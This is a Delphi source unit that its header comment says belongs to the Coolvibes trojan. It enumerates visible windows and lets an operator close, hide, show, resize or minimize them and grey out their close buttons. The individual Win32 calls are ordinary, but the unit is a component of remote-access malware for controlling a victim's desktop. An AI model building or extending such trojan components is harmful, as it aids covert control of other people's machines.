{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
para manejar ventanas}
unit UnitWindows;

interface

uses
  Windows,
  Messages,
  SysUtils;

  function GetWins():String;
  procedure CerrarVentana(Handle: HWND);
  procedure MostrarVentana(Handle: HWND);
  procedure OcultarVentana(Handle: HWND);
  procedure MaximizarVentana(Handle: HWND);
  procedure MinimizarVentana(Handle: HWND);
  procedure MinimizarTodas();
  procedure BotonCerrar(YesNo : Boolean; Handle : HWND);

implementation

var
  Cadena: String;

function GetWins():String;
  function EnumWindowProc(Hwnd: HWND; i: integer): boolean; stdcall;
  var
    Titulo : string;
  begin
    if (Hwnd=0) then
    begin
      result := false;
    end
    else
    begin
      SetLength(Titulo, 255);
      SetLength(Titulo, GetWindowText(Hwnd, PChar(Titulo), Length(Titulo)));
      if IsWindowVisible(Hwnd) and (Titulo<>'')  then
      begin
        Cadena:=Cadena+Titulo + '|' + IntToStr(Hwnd) + '|';
      end;
      Result := true;
    end;
  end;
begin
  Cadena:='';
  EnumWindows(@EnumWindowProc, 0);
  Result:=Cadena;
end;

procedure CerrarVentana(Handle: HWND);
begin
  SendMessage(Handle, WM_CLOSE, 0, 0);
end;

procedure MostrarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_SHOW);
end;

procedure OcultarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_HIDE);
end;

procedure MaximizarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_MAXIMIZE);
end;

procedure MinimizarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_MINIMIZE);
end;

procedure MinimizarTodas();
begin
  keybd_event(VK_LWIN,MapvirtualKey( VK_LWIN,0),0,0) ;
  keybd_event(Ord('M'),MapvirtualKey(Ord('M'),0),0,0);
  keybd_event(Ord('M'),MapvirtualKey(Ord('M'),0),KEYEVENTF_KEYUP,0);
  keybd_event(VK_LWIN,MapvirtualKey(VK_LWIN,0),KEYEVENTF_KEYUP,0);
end;

  procedure BotonCerrar(YesNo : Boolean; Handle : HWND);
var
hMnu: THandle;
begin
if YesNo = False then
  begin
  hMnu := GetSystemMenu(Handle, FALSE);
  EnableMenuItem(hMnu, SC_CLOSE, MF_GRAYED);
  end
else
  begin
  hMnu := GetSystemMenu(Handle, FALSE);
  EnableMenuItem(hMnu,SC_CLOSE, MF_ENABLED);
  end;
end;


end.
 